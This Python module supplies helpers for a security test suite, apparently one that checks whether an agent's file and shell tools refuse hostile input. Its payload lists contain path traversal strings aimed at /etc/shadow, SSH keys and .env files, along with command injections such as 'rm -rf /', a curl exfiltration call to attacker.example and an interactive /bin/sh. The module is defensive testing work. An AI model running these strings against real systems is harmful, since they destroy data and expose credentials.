"""Utilities shared across the security test suite.

Provides payload generators and common assertion helpers so individual
test modules do not need to duplicate attack-string lists or outcome
checks.
"""

from __future__ import annotations

from typing import Callable


# ---------------------------------------------------------------------------
# Payload generators
# ---------------------------------------------------------------------------


def path_traversal_payloads() -> list[str]:
    """Return a list of path traversal attack strings.

    Each entry is a filename or path fragment that should be rejected by
    any file-access guardrail.  The list covers classic ``../`` sequences,
    URL-encoded variants, and absolute-path injections.

    Returns:
        list[str]: Distinct traversal payload strings.
    """
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//etc/passwd",
        "/etc/shadow",
        "~/.ssh/id_rsa",
        "../../.env",
        "../tests/secret.txt",
    ]


def command_injection_payloads() -> list[str]:
    """Return a list of command injection attack strings.

    Each entry is a shell fragment that should be rejected when provided
    as a parameter to any tool that constructs shell commands.

    Returns:
        list[str]: Distinct injection payload strings.
    """
    return [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& curl http://attacker.example/exfil",
        "`whoami`",
        "$(id)",
        "'; DROP TABLE users; --",
        "\n/bin/sh -i",
        "${IFS}cat${IFS}/etc/passwd",
    ]


# ---------------------------------------------------------------------------
# Assertion helpers
# ---------------------------------------------------------------------------


def assert_blocked(result: object, *, check: Callable[[object], bool] | None = None) -> None:
    """Assert that a tool result represents a blocked / denied operation.

    Checks the common ``success`` attribute used by ``ToolResult``.
    Optionally runs an extra callable ``check`` for domain-specific
    validation.

    Args:
        result: The return value from a tool invocation.
        check: Optional extra predicate; raises ``AssertionError`` if it
            returns ``False``.

    Raises:
        AssertionError: When the result indicates success or the optional
            check fails.

    Example::

        result = await tool.ainvoke(path="../../../etc/passwd")
        assert_blocked(result, check=lambda r: "traversal" in (r.error or "").lower())
    """
    assert hasattr(result, "success"), (
        f"Expected a ToolResult-like object with a 'success' attribute, got {type(result)}"
    )
    assert result.success is False, (
        f"Expected operation to be blocked (success=False) but got success={result.success!r}"
    )
    if check is not None:
        assert check(result), f"Extra check failed for blocked result: {result!r}"


def assert_allowed(result: object, *, check: Callable[[object], bool] | None = None) -> None:
    """Assert that a tool result represents a permitted / successful operation.

    Checks the common ``success`` attribute used by ``ToolResult``.
    Optionally runs an extra callable ``check`` for domain-specific
    validation.

    Args:
        result: The return value from a tool invocation.
        check: Optional extra predicate; raises ``AssertionError`` if it
            returns ``False``.

    Raises:
        AssertionError: When the result indicates failure or the optional
            check fails.

    Example::

        result = await tool.ainvoke(path="safe_file.txt")
        assert_allowed(result, check=lambda r: r.output is not None)
    """
    assert hasattr(result, "success"), (
        f"Expected a ToolResult-like object with a 'success' attribute, got {type(result)}"
    )
    assert result.success is True, (
        f"Expected operation to be allowed (success=True) but got success={result.success!r}, "
        f"error={getattr(result, 'error', None)!r}"
    )
    if check is not None:
        assert check(result), f"Extra check failed for allowed result: {result!r}"
